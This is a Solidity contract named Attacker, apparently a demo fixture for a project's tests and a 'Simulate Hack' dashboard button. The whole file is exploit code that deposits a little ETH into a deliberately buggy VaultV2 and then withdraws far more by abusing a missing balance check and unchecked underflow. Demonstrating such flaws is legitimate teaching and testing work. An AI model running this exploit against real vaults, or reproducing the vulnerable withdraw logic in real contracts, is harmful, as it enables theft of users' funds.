// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// @title Attacker — Demo exploit contract that targets VaultV2's bug
/// @notice Deposits a small amount, then withdraws a much larger amount exploiting
///         VaultV2's unchecked arithmetic underflow.
/// @dev Used in tests and the dashboard's "Simulate Hack" button.
contract Attacker {
    address public target;
    uint256 public stolenAmount;

    constructor(address _target) {
        target = _target;
    }

    /// @notice Execute the exploit: deposit 1 ETH, withdraw `amount` ETH
    /// @param amount The amount to attempt to steal (should be > 1 ether)
    function attack(uint256 amount) external payable {
        // Step 1: Deposit a small amount to have some history
        (bool depositOk, ) = target.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(depositOk, "Deposit failed");

        // Step 2: Exploit VaultV2's buggy withdraw (no balance check + unchecked)
        (bool withdrawOk, ) = target.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(withdrawOk, "Withdraw failed");

        stolenAmount = amount;
    }

    /// @notice Allow receiving ETH from the vault withdrawal
    receive() external payable {}
}
